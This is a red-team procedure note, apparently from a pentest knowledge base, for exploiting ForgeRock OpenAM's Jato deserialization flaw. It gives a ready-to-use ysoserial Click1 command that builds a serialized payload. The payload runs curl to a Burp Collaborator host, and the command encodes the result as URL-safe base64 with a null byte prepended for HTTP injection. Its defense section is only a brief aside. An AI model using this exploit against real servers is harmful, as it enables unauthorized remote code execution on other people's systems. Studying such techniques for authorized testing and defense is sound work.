---
tags:
  - payload-generation
  - deserialization
  - ysoserial
type: procedure
tools:
  - '[[tools/ysoserial]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/java-ysoserial-generate-payload]]'
verified: false
platforms:
  - Linux
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:31:18.980Z'
sub_techniques: []
id: ef7685b2-d0c4-4519-bc1c-84a8307d8e4f
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Generate-Deserialization-Payload

## Summary

This procedure generates a malicious Java deserialization payload using ysoserial's Click1 gadget chain, encoding it in URL-safe base64 for injection into an HTTP request to exploit ForgeRock OpenAM's Jato framework vulnerability.

## Description

Unsafe deserialization in Java applications like OpenAM allows attackers to provide serialized objects that, when deserialized, execute arbitrary code via gadget chains. Ysoserial automates this by chaining libraries present in the target (e.g., Click1 from Jato). The payload executes a curl command to a Burp Collaborator for OOB confirmation. The output is processed to prepend a null byte, base64 encode, and make URL-safe for parameter injection.

## Requirements

1. Downloaded ysoserial JAR
2. Java runtime environment (JDK/JRE)
3. Burp Collaborator instance for OOB detection
4. Bash shell for processing

## Defense

Defensive measures and detection strategies:

- Disable or restrict deserialization in web apps (e.g., use not-so-serializer libraries)
- Input validation on serialized data parameters
- Monitor for unusual Java class loading or gadget chain indicators in logs
- Network monitoring for OOB callbacks to collaborator-like domains

## Objectives

1. Create a functional gadget chain payload
2. Encode payload for HTTP transmission
3. Set up command execution for RCE verification

## Instructions

### Step 1: Execute Ysoserial with Click1 Gadget

**Context**: Generate the raw serialized payload that triggers the Click1 chain to run a curl command on deserialization.

**Command** ([[commands/java-ysoserial-generate-payload]]):
```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Click1 "curl https://your-unique-id.burpcollaborator.net" | (echo -ne \x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt
```

> This runs Java on the JAR with Click1 gadget and the curl command as payload. The pipe prepends a null byte (\x00), base64 encodes, converts to URL-safe (tr '/+' '_-'), removes padding and newlines, and saves to payload.txt. Replace the Collaborator URL with your unique ID. Expected output: A single-line base64 string in payload.txt.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used

- [[commands/java-ysoserial-generate-payload]]

## Tools Used

- [[tools/ysoserial]]

## Tags

- payload-generation
- deserialization
- ysoserial
